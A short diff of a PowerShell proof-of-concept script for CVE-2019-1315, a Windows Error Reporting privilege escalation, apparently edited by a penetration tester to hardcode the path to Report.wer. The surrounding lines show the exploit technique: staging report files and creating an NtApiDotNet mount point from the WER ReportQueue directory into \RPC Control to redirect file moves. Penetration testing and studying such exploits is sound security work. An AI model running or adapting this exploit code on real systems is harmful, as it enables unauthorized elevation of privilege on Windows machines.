@@ -5,8 +5,8 @@ $TempReportDir = "C:\Users\cnpentester1\Downloads\CVE-2019-1315-master"
 function Invoke-MoveFileUsingWER($Source, $Destination) {
     Write-Host "Setting up dirs & files..."
     New-Item -Type Directory -Path $TempReportDir -Force | Out-Null
-    Copy-Item "$PSScriptRoot\Report.wer" "$TempReportDir\Report.wer" -ErrorAction Stop
-    Copy-Item "$PSScriptRoot\Report.wer" "$TempReportDir\Report.wer.tmp" -ErrorAction Stop
+    Copy-Item "C:\Users\cnpentester1\Downloads\CVE-2019-1315-master\Report.wer" "$TempReportDir\Report.wer" -ErrorAction Stop
+    Copy-Item "C:\Users\cnpentester1\Downloads\CVE-2019-1315-master\Report.wer" "$TempReportDir\Report.wer.tmp" -ErrorAction Stop
 
     Write-Host "Setting up pseudo-symlinks..."
     [NtApiDotNet.NtFile]::CreateMountPoint("\??\$env:ProgramData\Microsoft\Windows\WER\ReportQueue\a_b_c_d_e", "\RPC Control", $null)
